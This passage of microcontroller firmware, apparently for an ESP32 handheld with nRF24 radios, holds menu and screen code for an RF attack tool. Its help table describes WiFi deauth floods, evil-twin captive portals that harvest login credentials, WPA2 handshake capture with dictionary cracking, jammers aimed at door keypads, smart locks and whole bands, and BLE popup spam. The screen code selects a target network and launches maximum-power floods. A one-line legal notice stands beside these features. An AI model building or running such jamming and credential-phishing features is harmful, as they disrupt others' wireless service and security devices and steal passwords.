    if (gSel==1){ ggNrfProfSave(gSlot,*gNrfCfg); ggBack(); return; }
    if (gSel==2){ ggNrfProfErase(gSlot); ggBack(); return; }
  }
  char t[18]; snprintf(t,sizeof(t),"Slot %u",gSlot);
  int lt=0; ggMenu(t, used?PA_USED:PA_EMPTY, n, gSel, lt, used?"":"stores current setup");
}

// ---------------------------------------------------------------- SETTINGS
enum { ST_VOL=0, ST_BEEP, ST_NMODE, ST_EDITB, ST_STATUS, ST_CNT2 };
static const char* ggSetHint(int f){ switch(f){ case ST_VOL:return "Speaker loudness 0-10";
  case ST_BEEP:return "Play a beep"; case ST_NMODE:return "How the 2 radios work";
  case ST_EDITB:return "Set radio B (dual-tx)"; case ST_STATUS:return "Radio+memory status"; } return ""; }
static inline void ggScreenSettings() {
  if (gEditing) {
    if (gSel==ST_VOL)   { if(gEv.up && gSet.volume<10)gSet.volume++; if(gEv.down && gSet.volume>0)gSet.volume--; ggSetVolume(gSet.volume); }
    if (gSel==ST_NMODE) { if(gEv.up)ggCycle(gSet.nrfMode,3,+1); if(gEv.down)ggCycle(gSet.nrfMode,3,-1); }
    if (gEv.sel || gEv.back) gEditing=false;
  } else {
    ggMove(0, ST_CNT2-1);
    if (gEv.back){ ggSaveSettings(gSet); ggBack(); return; }
    if (gEv.sel) {
      if (gSel==ST_BEEP) ggBeep(2000,120);
      else if (gSel==ST_EDITB) { ggSaveSettings(gSet); gNrfCfg=&gNrfB; ggGo(GS_NRF); return; }
      else if (gSel==ST_STATUS) { ggGo(GS_SYSTEM); return; }
      else gEditing=true;
    }
  }
  static char rows[ST_CNT2][22]; const char* p[ST_CNT2];
  snprintf(rows[ST_VOL],22,"Volume: %u", gSet.volume);
  snprintf(rows[ST_BEEP],22,"Beep >");
  snprintf(rows[ST_NMODE],22,"Radio mode: %s", GG_NM_NAME[gSet.nrfMode>2?2:gSet.nrfMode]);
  snprintf(rows[ST_EDITB],22,"Set radio B >");
  snprintf(rows[ST_STATUS],22,"System status >");
  for(int i=0;i<ST_CNT2;i++) p[i]=rows[i];
  ggMenu("Settings", p, ST_CNT2, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggSetHint(gSel));
}

// ---------------------------------------------------------------- STATUS
enum { SY_A=0,SY_B,SY_RECHK,SY_HEAP,SY_VER,SY_CNT };
static inline void ggScreenSystem() {
  ggMove(0, SY_CNT-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel && gSel==SY_RECHK){ ggNrfRecheck(); }
  static char rows[SY_CNT][24]; const char* p[SY_CNT];
  snprintf(rows[SY_A],24,"Radio A: %s", ggNrfPresentA?"OK":"NOT FOUND");
  snprintf(rows[SY_B],24,"Radio B: %s", ggNrfPresentB?"OK":"NOT FOUND");
  snprintf(rows[SY_RECHK],24,"Re-check radios >");
  snprintf(rows[SY_HEAP],24,"Free mem: %lu",(unsigned long)ESP.getFreeHeap());
  snprintf(rows[SY_VER],24,"%s", GG_VERSION);
  for(int i=0;i<SY_CNT;i++) p[i]=rows[i];
  ggMenu("Status", p, SY_CNT, gSel, gTop, "Check wiring if N/F");
}

// ---------------------------------------------------------------- HELP / GUIDE
struct GgHelp { const char* title; const char* l1; const char* l2; const char* l3; const char* l4; };
// Every line is kept <=21 chars so it never clips on the 128px-wide screen.
static const GgHelp GG_HELP[] = {
  {"What is this?",  "A 2.4GHz radio that",  "SENDS data packets",   "to another nRF24.",    "Not a wifi jammer."},
  {"Send a packet",  "Transmit > SEND NOW,", "tap SELECT to fire.",  "PAIR mode + 2 radios", "lets you see it land."},
  {"Choose payload", "Transmit > Payload.",  "UP/DN sets a byte,",   "tap SEL = next byte,", "hold SEL = add byte."},
  {"Save payloads",  "Transmit>My payloads", "saves current bytes",  "to a slot. Load one",  "back to fire fast."},
  {"Send saved",     "My payloads: pick",    "one, Load & send",     "fires it now. Set",    "amount on Transmit."},
  {"Two radios",     "Settings>Radio mode:", "PAIR: A tx, B hears.", "DUAL: A+B both send.", "HOTSWAP: use one."},
  {"Channel+Speed",  "Channel 0-125 is the", "frequency. Speed is",  "the data rate. Both",  "radios must match."},
  {"Address",        "A 5-byte name both",   "radios share. The",    "receiver needs the",   "same address, too."},
  {"Beacon",         "Sends one packet",     "over and over on a",   "timer. Good for",      "soak-running an RX."},
  {"Range check",     "A steady tone on one", "channel. Walk away",   "to see how far it",    "reaches. OFF after."},
  {"Find channel",   "Listens on every",     "channel, shows the",   "busy ones. Hold SEL",  "to grab a clear one."},
  {"Burst",          "Advanced > Burst",     "count = packets per",  "SEND. Gap = ms",       "between each one."},
  {"Not sending?",   "Status must show",     "both radios OK. If",   "NOT FOUND, check",     "wiring and power."},
  {"Cop/Surv scan",  "WiFi-only scan for",   "surveillance SSIDs:",  "Flock, Axon, ALPR,",   "Genetec, Verkada..."},
  {"Tracker scan",   "BLE-only scan for",    "trackers: AirTag,",    "Tile, SmartTag,",      "Chipolo, Garmin..."},
  {"WiFi TX",        "Beacon flood on a",    "WiFi ch. Pick network","to auto-set. Rate in", "PPS, power, payload."},
  {"WiFi Flood",     "Pick a network then",  "flood all clients.",   "Check Faraday cage",   "shielding for leaks."},
  {"BLE TX",         "BLE ads on all or",    "single ch 37/38/39.",  "Set PPS rate, power,", "payload. Scan nearby."},
  {"Channel Thief",  "CSA tells devices WiFi","moved channels. Quiet", "IE + nRF + BLE jam",   "block the real ch."},
  {"Keypad buster",  "Jams wireless 2.4G",   "keypads (door locks,", "garage openers) by",   "flooding their ch."},
  {"Radius jammer",  "Scans ALL nearby",     "networks, then jams",  "every channel found.", "WiFi+BLE+nRF."},
  {"Beacon spam",    "Floods fake WiFi",     "SSIDs with NAV. All",  "phones see phantom",   "networks appear."},
  {"BLE spam",       "Fake Apple device",    "popups on iPhones.",   "Proximity Pairing",    "broadcast flood."},
  {"Evil Twin",      "Clones a WiFi AP",     "as open network.",     "Captive portal traps", "login credentials."},
  {"Probe Harvest",  "Passive sniff of",     "probe requests.",      "Shows what WiFi",      "devices search for."},
  {"WiFi Rickroll",  "Broadcast a custom",   "message as a WiFi",    "network name. All",    "nearby phones see."},
  {"Smart Lock",     "BLE disruption for",   "smart locks. Targets", "BLE data channels",    "with nRF+BLE noise."},
  {"Network Audit",  "Scans WiFi nets and",  "shows encryption:",    "OPEN/WEP/WPA/WPA2/",  "WPA3 + security."},
  {"Saved Creds",    "View credentials",     "caught by Evil Twin.", "User:pass list.",      "SEL on [CLEAR ALL]."},
  {"Auth Flood",     "Floods target AP",     "with 802.11 auth",     "request frames.",      "Exhausts AP table."},
  {"WiFi Fuzzer",    "Random frame types",   "and lengths on any",   "channel. Protocol",    "stress test tool."},
  {"Quiet Storm",    "802.11h Quiet IE",     "in beacon frames.",     "Tells clients to",     "stop transmitting."},
  {"BSSID Clone",    "Spoofs exact BSSID",   "and SSID of a real",    "AP. Confuses WiFi",    "clients on channel."},
  {"Fake AP Farm",   "Broadcasts 12 fake",   "SSIDs at once.",        "Junk networks flood",  "WiFi scanner lists."},
  {"Time Bomb",      "Arms a countdown,",    "then auto-starts",     "Channel Thief when",   "timer hits zero."},
  {"Deauth Detect",  "Passive monitor for",  "deauth/disassoc.",      "Hops WiFi channels",   "to find attackers."},
  {"Geofence",       "Scans for a target",   "SSID periodically.",    "Alerts when the",      "network appears."},
  {"MAC Harvest",    "Collects unique BLE",  "MAC addresses from",    "nearby devices. Shows","RSSI and count."},
  {"Prox Alert",     "Beeps when any BLE",   "device signal is",      "above threshold.",     "Close range warning."},
  {"UUID Scanner",   "Scans BLE devices",    "and shows service",     "UUIDs. Identifies",    "device types."},
  {"BLE Range",      "Signal strength",      "meter for nearest",     "BLE device. Bar",      "graph display."},
  {"Progressive Jam","Starts low power,",    "ramps up over time.",   "WiFi+BLE+nRF all",     "increase together."},
  {"Chain Attack",   "Cycles WiFi>BLE>nRF",  "phases 10s each.",      "Different radio",      "active each phase."},
  {"Auto-Target",    "Scans and picks the",  "strongest WiFi AP,",    "then hits it with",    "all 3 radios."},
  {"WiFi Heatmap",   "Bar chart of APs",     "per WiFi channel.",     "Shows congestion",     "across 1-14."},
  {"Band Occupancy", "nRF spectrum sweep",   "across 0-125 ch.",      "Shows real-time RF",   "energy levels."},
  {"Packet Rate",    "Counts WiFi packets",  "per second in",         "promiscuous mode.",    "Live traffic meter."},
  {"Attack Timer",   "Countdown to auto-",   "start an attack type.", "Choose: Ch Thief,",    "Beacon, or BLE."},
  {"FastPair Spam",  "Google Fast Pair",     "popups on Android.",    "Fake earbuds/phones",  "pair requests."},
  {"Samsung Spam",   "Samsung Buds fake",    "popups on Galaxy.",     "Spoofs Buds Pro,",     "Buds Live, etc."},
  {"SwiftPair Spam", "Microsoft Swift",      "Pair popups. Fake",     "keyboards, mice,",     "headsets appear."},
  {"Name Spam",      "Random IoT device",    "names broadcast.",      "TV, Cam, Lock,",       "Thermostat, etc."},
  {"Coffee Portal",  "Evil Twin themed",     "as coffee shop.",       "'Free WiFi' login",    "page for testing."},
  {"Hotel Portal",   "Evil Twin themed",     "as hotel guest net.",   "Room number +",        "last name login."},
  {"Update Portal",  "Evil Twin themed",     "as router firmware.",   "'Re-enter WiFi",       "password' prompt."},
  {"WiFi Crack",     "Captures WPA2 4-way",  "EAPOL handshake via",  "nRF jam. Dictionary",  "attack on-device."},
  {"Blackout",       "ALL radios on ALL",    "channels at once.",    "WiFi 1-14 + BLE +",   "nRF 0-125 full band."},
  {"Legal",          "Only transmit on",     "bands you may use.",   "Don't jam or block",   "others. Be safe."},
};
#define GG_HELP_N (int)(sizeof(GG_HELP)/sizeof(GG_HELP[0]))
static inline void ggScreenHelp() {
  if (gEv.up) ggStepU8(gHelpSel,-1,0,GG_HELP_N-1);
  if (gEv.down) ggStepU8(gHelpSel,+1,0,GG_HELP_N-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel){ ggGo(GS_HELPPAGE); return; }
  static char rows[GG_HELP_N][22]; const char* p[GG_HELP_N];
  for(int i=0;i<GG_HELP_N;i++){ snprintf(rows[i],22,"%s",GG_HELP[i].title); p[i]=rows[i]; }
  int top=gHelpSel<4?0:gHelpSel-3;
  ggMenu("Help & Guide", p, GG_HELP_N, gHelpSel, top, "SEL=read  BACK");
}
static inline void ggScreenHelpPage() {
  if (gEv.back){ ggBack(); return; }
  if (gEv.down && gHelpSel<GG_HELP_N-1) gHelpSel++;
  if (gEv.up   && gHelpSel>0) gHelpSel--;
  const GgHelp& h = GG_HELP[gHelpSel];
  ggOled.clearDisplay(); ggHeader(h.title);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  // 4 body lines on a 9px grid (y16..y43) so nothing lands on the y54 footer
  ggOled.setCursor(2,16); ggOled.print(h.l1);
  ggOled.setCursor(2,25); ggOled.print(h.l2);
  ggOled.setCursor(2,34); ggOled.print(h.l3);
  ggOled.setCursor(2,43); ggOled.print(h.l4);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56);
  ggOled.printf("%d/%d  UP/DN  BACK", gHelpSel+1, GG_HELP_N);
  ggOled.display();
}

// ---------------------------------------------------------------- SCANS (cop + tracker)
//  NON-BLOCKING: WiFi runs an async scan and BLE runs a background scan with a
//  per-advert callback, so this screen redraws every loop and BACK/SELECT stay
//  instant. It LISTENS only - the nRF24s are idle and nothing is transmitted.
// ---------------------------------------------------------------- COP / SURVEILLANCE SCAN (WiFi only)
static inline void ggScreenCopScan() {
#if !GG_ENABLE_DETECT
  ggBack();
#else
  if (!gRunInit) { ggCopScanBegin(); gRunInit=true; }
  if (gEv.back) { ggCopScanEnd(); ggBack(); return; }
  if (gEv.sel)  { ggCopWifiSeen=0; ggCopWifiHit=0; ggCopBleSeen=0; ggCopBleHit=0; ggCopLast[0]=0; }
  ggCopScanPoll();
  bool hit = ggCopNewHit; ggCopNewHit=false;
  uint32_t totalHit = ggCopWifiHit + ggCopBleHit;

  ggOled.clearDisplay(); ggHeader("Cop/Surv scan");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("W:%lu B:%lu scanned",(unsigned long)ggCopWifiSeen,(unsigned long)ggCopBleSeen);
  ggOled.setCursor(2,28);
  if (totalHit > 0) {
    ggOled.setTextSize(2); ggOled.printf("%lu HIT!",(unsigned long)totalHit); ggOled.setTextSize(1);
  } else {
    ggOled.setTextSize(2); ggOled.print("0 clear"); ggOled.setTextSize(1);
  }
  ggOled.setCursor(2,45);
  if (ggCopLast[0]) ggOled.print(ggCopLast);
  else ggOled.print("Flock/Axon/Verkada..");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56);
  ggOled.print("scanning  SEL=reset");
  ggOled.display();
  if (hit) { ggBeep(2300,60); ggBeep(2700,90); }
#endif
}

// ---------------------------------------------------------------- TRACKER SCAN (BLE only)
static inline void ggScreenTrackerScan() {
#if !GG_ENABLE_DETECT
  ggBack();
#else
  if (!gRunInit) { ggTrkScanBegin(); gRunInit=true; }
  if (gEv.back) { ggTrkScanEnd(); ggBack(); return; }
  if (gEv.sel)  { ggTrkBleSeen=0; ggTrkTrackCnt=0; ggTrkLast[0]=0; }

  bool hit = ggTrkNewHit; ggTrkNewHit=false;

  ggOled.clearDisplay(); ggHeader("Tracker scan");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("BLE seen: %lu",(unsigned long)ggTrkBleSeen);
  ggOled.setCursor(2,28);
  if (ggTrkTrackCnt > 0) {
    ggOled.setTextSize(2); ggOled.printf("%lu found",(unsigned long)ggTrkTrackCnt); ggOled.setTextSize(1);
  } else {
    ggOled.setTextSize(2); ggOled.print("0 clear"); ggOled.setTextSize(1);
  }
  ggOled.setCursor(2,45);
  if (ggTrkLast[0]) ggOled.print(ggTrkLast);
  else ggOled.print("AirTag/Tile/SmartTag");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56);
  ggOled.print("scanning  SEL=reset");
  ggOled.display();
  if (hit) { ggBeep(2300,60); ggBeep(2700,90); }
#endif
}

// ---------------------------------------------------------------- WIFI TX config
enum { W_SEND=0, W_CH, W_PWR, W_PPS, W_FRAME, W_DUR, W_DATA, W_PICK, W_FLOOD, W_SAVE, W_LOAD, W_CNT };
static const char* ggWifiHint(int f) {
  switch (f) { case W_SEND:return "Fire beacons now"; case W_CH:return "WiFi ch 1-14";
    case W_PWR:return "TX strength"; case W_PPS:return "Packets per second";
    case W_FRAME:return "Bigger=more airtime"; case W_DUR:return "0=keep going";
    case W_DATA:return "Data in beacon SSID"; case W_PICK:return "Scan & auto-set ch";
    case W_FLOOD:return "Deauth flood now!"; case W_SAVE:return "Store to flash now"; case W_LOAD:return "Restore from flash"; } return "";
}
static inline void ggWifiLabel(int f, char* o, size_t n) {
  switch (f) {
    case W_SEND:  snprintf(o,n,"SEND NOW >"); break;
    case W_CH:    snprintf(o,n,"Channel: %u", gWifiTx.channel); break;
    case W_PWR:   snprintf(o,n,"Power: %s", GG_WP_NAME[gWifiTx.power>3?3:gWifiTx.power]); break;
    case W_PPS:   snprintf(o,n,"Rate: %u pps", gWifiTx.pps); break;
    case W_FRAME: snprintf(o,n,"Frame: %s", GG_WF_NAME[gWifiTx.frameSize>1?1:gWifiTx.frameSize]); break;
    case W_DUR:   if (gWifiTx.durationSec==0) snprintf(o,n,"Duration: CONT");
                  else snprintf(o,n,"Duration: %us", gWifiTx.durationSec); break;
    case W_DATA:  snprintf(o,n,"Payload: %02X%02X.. >",gWifiTx.payload[0],gWifiTx.payloadLen>1?gWifiTx.payload[1]:0); break;
    case W_PICK:  snprintf(o,n,"Pick network >"); break;
    case W_FLOOD: snprintf(o,n,"Deauth flood >"); break;
    case W_SAVE:  snprintf(o,n,"Save config"); break;
    case W_LOAD:  snprintf(o,n,"Load config"); break;
  }
}
static inline void ggWifiAdjust(int f, int dir) {
  switch (f) {
    case W_CH:    { int v=(int)gWifiTx.channel+dir; if(v<1)v=14; if(v>14)v=1; gWifiTx.channel=(uint8_t)v; break; }
    case W_PWR:   ggCycle(gWifiTx.power,4,dir); break;
    case W_PPS:   ggStepU16(gWifiTx.pps,dir,10,10,1000); break;
    case W_FRAME: ggCycle(gWifiTx.frameSize,2,dir); break;
    case W_DUR:   { int v=(int)gWifiTx.durationSec+dir*10; if(v<0)v=0; if(v>300)v=300; gWifiTx.durationSec=(uint16_t)v; break; }
  }
}
static inline void ggScreenWifiTx() {
  if (gEditing) {
    if (gEv.up) ggWifiAdjust(gSel,+1); if (gEv.down) ggWifiAdjust(gSel,-1);
    if (gEv.sel||gEv.back) gEditing=false;
  } else {
    ggMove(0, W_CNT-1);
    if (gEv.back){ ggBack(); return; }
    if (gEv.sel) {
      switch (gSel) {
        case W_SEND: ggGo(GS_WIFI_TX_RUN); return;
        case W_DATA: ggOpenBytes(gWifiTx.payload, gWifiTx.payloadLen, "WIFI DATA", false, &gWifiTx.payloadLen, 32); return;
        case W_PICK: ggGo(GS_WIFI_PICK); return;
        case W_FLOOD: gWifiFloodMode=true; ggGo(GS_WIFI_PICK); return;
        case W_SAVE: ggSaveWifiTx(gWifiTx); ggChirpUp(); break;
        case W_LOAD: if (ggLoadWifiTx(gWifiTx)) ggChirpDown(); break;
        default: gEditing=true; break;
      }
    }
  }
  static char rows[W_CNT][22]; const char* p[W_CNT];
  for (int i=0;i<W_CNT;i++){ ggWifiLabel(i,rows[i],sizeof(rows[i])); p[i]=rows[i]; }
  ggMenu("WiFi TX", p, W_CNT, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggWifiHint(gSel));
}

// ---------------------------------------------------------------- WIFI TX run
static inline void ggScreenWifiTxRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiTxBegin(gWifiTx);
    if (ggWifiDeauthMode) ggFloodNrfStart(gWifiTx.channel);
    gWifiTxStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggFloodNrfStop(); ggWifiTxEnd(); ggBack(); return; }
  if (gWifiTx.durationSec > 0) {
    uint32_t el = (millis()-gWifiTxStartMs)/1000;
    if (el >= gWifiTx.durationSec) { ggFloodNrfStop(); ggWifiTxEnd(); ggBack(); return; }
  }
  if (gEv.up)   { int v=(int)gWifiTx.channel+1; if(v>14)v=1;  gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); if(ggFloodNrfActive){ggFloodNrfStop();ggFloodNrfStart(gWifiTx.channel);} }
  if (gEv.down) { int v=(int)gWifiTx.channel-1; if(v<1)v=14; gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); if(ggFloodNrfActive){ggFloodNrfStop();ggFloodNrfStart(gWifiTx.channel);} }
  ggFloodNrfPump();
  uint32_t cnt = ggWifiPktCnt;
  uint32_t elapsed = (millis()-gWifiTxStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/100;
  bool flood = ggWifiDeauthMode;
  ggOled.clearDisplay(); ggHeader(flood ? "RF FLOOD" : "WiFi TX");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  if (flood) {
    ggOled.setCursor(34,18); ggOled.printf("CH%u QUAD+NAV", gWifiTx.channel);
  } else {
    ggOled.setCursor(34,18); ggOled.printf("CH%u %s %s", gWifiTx.channel, GG_WP_NAME[gWifiTx.power>3?3:gWifiTx.power], GG_WF_NAME[gWifiTx.frameSize>1?1:gWifiTx.frameSize]);
  }
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45);
  if (flood && ggFloodNrfActive) {
    ggOled.printf("%lu/s nRF ch%u-%u",(unsigned long)pps,ggFloodNrfChLo,ggFloodNrfChHi);
  }
  else if (ggWifiTxErr > 0) ggOled.printf("%lu/s err:0x%lX",(unsigned long)pps,(unsigned long)ggWifiLastErr);
  else if (gWifiTx.durationSec>0) { uint32_t left=gWifiTx.durationSec>elapsed?gWifiTx.durationSec-elapsed:0; ggOled.printf("%lu/s %lus left",(unsigned long)pps,(unsigned long)left); }
  else ggOled.printf("%lu/s  on air %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  UP/DN ch");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI pick network
static inline void ggScreenWifiPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { gWifiFloodMode=false; ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Pick network");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Pick network");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gWifiTx.channel=ggWifiAPs[gSel].channel;
    if (gWifiFloodMode) {
      ggWifiDeauthMode = true;
      memcpy(ggWifiDeauthBssid, ggWifiAPs[gSel].bssid, 6);
      gWifiFloodMode=false;
      gWifiTx.pps=1000; gWifiTx.power=GG_WP_MAX; gWifiTx.frameSize=GG_WF_256; gWifiTx.durationSec=0;
    }
    ggWifiPickScanEnd();
    if (ggWifiDeauthMode) {
      ggClickFire();
      ggBack(); ggGo(GS_WIFI_TX_RUN);
    } else {
      ggBack();
    }
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu(gWifiFloodMode?"Flood target":"Pick network", p, ggWifiAPCount, gSel, gTop, gWifiFloodMode?"SEL=flood this ch":"SEL=use this channel");
}

// ---------------------------------------------------------------- BLE TX config
enum { B_SEND=0, B_PPS, B_PWR, B_CHAN, B_DUR, B_DATA, B_SCAN, B_FLOOD, B_SAVE, B_LOAD, B_CNT };
static const char* ggBleHint(int f) {
  switch (f) { case B_SEND:return "Start broadcasting"; case B_PPS:return "Packets per second";
    case B_PWR:return "TX strength"; case B_CHAN:return "ALL or single ch";
    case B_DUR:return "0=keep going"; case B_DATA:return "Edit BLE payload";
    case B_SCAN:return "See nearby BLE devs"; case B_FLOOD:return "Max BLE & blast!";
    case B_SAVE:return "Store to flash now"; case B_LOAD:return "Restore from flash"; } return "";
}
static inline void ggBleLabel(int f, char* o, size_t n) {
  switch (f) {
    case B_SEND: snprintf(o,n,"SEND NOW >"); break;
    case B_PPS:  snprintf(o,n,"Rate: %u pps", gBleTx.pps); break;
    case B_PWR:  snprintf(o,n,"Power: %s", GG_BP_NAME[gBleTx.power>3?3:gBleTx.power]); break;
    case B_CHAN: snprintf(o,n,"Channels: %s", GG_BC_NAME[gBleTx.channels>3?3:gBleTx.channels]); break;
    case B_DUR:  if (gBleTx.durationSec==0) snprintf(o,n,"Duration: CONT");
                 else snprintf(o,n,"Duration: %us", gBleTx.durationSec); break;
    case B_DATA: snprintf(o,n,"Payload: %02X%02X.. >",gBleTx.payload[0],gBleTx.payloadLen>1?gBleTx.payload[1]:0); break;
    case B_SCAN: snprintf(o,n,"Scan BLE >"); break;
    case B_FLOOD: snprintf(o,n,"Flood >"); break;
    case B_SAVE: snprintf(o,n,"Save config"); break;
    case B_LOAD: snprintf(o,n,"Load config"); break;
  }
}
static inline void ggBleAdjust(int f, int dir) {
  switch (f) {
    case B_PPS:  ggStepU16(gBleTx.pps,dir,10,1,500); break;
    case B_PWR:  ggCycle(gBleTx.power,4,dir); break;
    case B_CHAN: ggCycle(gBleTx.channels,4,dir); break;
    case B_DUR:  { int v=(int)gBleTx.durationSec+dir*10; if(v<0)v=0; if(v>300)v=300; gBleTx.durationSec=(uint16_t)v; break; }
  }
}
static inline void ggScreenBleTx() {
  if (gEditing) {
    if (gEv.up) ggBleAdjust(gSel,+1); if (gEv.down) ggBleAdjust(gSel,-1);
    if (gEv.sel||gEv.back) gEditing=false;
  } else {
    ggMove(0, B_CNT-1);
    if (gEv.back){ ggBack(); return; }
    if (gEv.sel) {
      switch (gSel) {
        case B_SEND: ggGo(GS_BLE_TX_RUN); return;
        case B_DATA: ggOpenBytes(gBleTx.payload, gBleTx.payloadLen, "BLE DATA", false, &gBleTx.payloadLen, 26); return;
        case B_SCAN: ggGo(GS_BLE_SCAN); return;
        case B_FLOOD:
          gBleTx.pps=500; gBleTx.power=GG_BP_MAX; gBleTx.channels=GG_BC_ALL; gBleTx.durationSec=0;
          ggBleFloodMode=true;
          ggClickFire(); ggGo(GS_BLE_TX_RUN); return;
        case B_SAVE: ggSaveBleTx(gBleTx); ggChirpUp(); break;
        case B_LOAD: if (ggLoadBleTx(gBleTx)) ggChirpDown(); break;
        default: gEditing=true; break;
      }
    }
  }
  static char rows[B_CNT][22]; const char* p[B_CNT];
  for (int i=0;i<B_CNT;i++){ ggBleLabel(i,rows[i],sizeof(rows[i])); p[i]=rows[i]; }
  ggMenu("BLE TX", p, B_CNT, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggBleHint(gSel));
}

// ---------------------------------------------------------------- BLE TX run
static inline void ggScreenBleTxRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    if (ggWifiTxRun)   ggWifiTxEnd();
    ggBleTxBegin(gBleTx);
    if (ggBleFloodMode) ggBleFloodNrfStart();
    gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggFloodNrfStop(); ggBleTxEnd(); ggBack(); return; }
  if (gBleTx.durationSec > 0) {
    uint32_t el = (millis()-ggBleTxStartMs)/1000;
    if (el >= gBleTx.durationSec) { ggFloodNrfStop(); ggBleTxEnd(); ggBack(); return; }
  }
  // flood mode: cycle MAC + restart advertising each frame
  if (ggBleFloodMode) ggBleFloodCycle();
  ggFloodNrfPump();
  uint32_t elapsed = (millis()-ggBleTxStartMs)/1000;
  uint32_t pktEst = ggBlePktEst();
  uint32_t pps = elapsed > 0 ? pktEst / elapsed : 0;
  gPhase = pktEst/50;
  bool flood = ggBleFloodMode;
  ggOled.clearDisplay(); ggHeader(flood ? "BLE FLOOD" : "BLE TX");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  if (flood) {
    ggOled.setCursor(34,18); ggOled.print("3-RADIO BLE MAX");
  } else {
    ggOled.setCursor(34,18); ggOled.printf("%upps %s %s", gBleTx.pps, GG_BP_NAME[gBleTx.power>3?3:gBleTx.power], GG_BC_NAME[gBleTx.channels>3?3:gBleTx.channels]);
  }
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(pktEst)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45);
  if (flood && ggFloodNrfActive) {
    ggOled.printf("%lu/s nRF ch0-83",(unsigned long)pps);
  }
  else if (gBleTx.durationSec>0) { uint32_t left=gBleTx.durationSec>elapsed?gBleTx.durationSec-elapsed:0; ggOled.printf("%lu/s %lus left",(unsigned long)pps,(unsigned long)left); }
  else ggOled.printf("%lu/s %s %lus",(unsigned long)pps,GG_BC_NAME[gBleTx.channels>3?3:gBleTx.channels],(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- BLE scan (device picker)
static inline void ggScreenBleScan() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggBlePickScanBegin();
    gRunInit = true;
  }
  if (gEv.back) { ggBlePickScanEnd(); ggBack(); return; }
  if (!ggBlePickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("BLE Scan");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.setCursor(2,35); ggOled.printf("Found: %d", ggBlePickDevCount);
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggBlePickDevCount == 0) {
    ggOled.clearDisplay(); ggHeader("BLE Scan");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No devices found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggBlePickDevCount-1);
  static char rows[GG_BLE_PICK_MAX][22]; const char* p[GG_BLE_PICK_MAX];
  for (int i=0;i<ggBlePickDevCount;i++){
    snprintf(rows[i],22,"%.9s %ddBm",ggBlePickDevs[i].name,ggBlePickDevs[i].rssi);
    p[i]=rows[i];
  }
  ggMenu("BLE Scan", p, ggBlePickDevCount, gSel, gTop, "Nearby BLE devices");
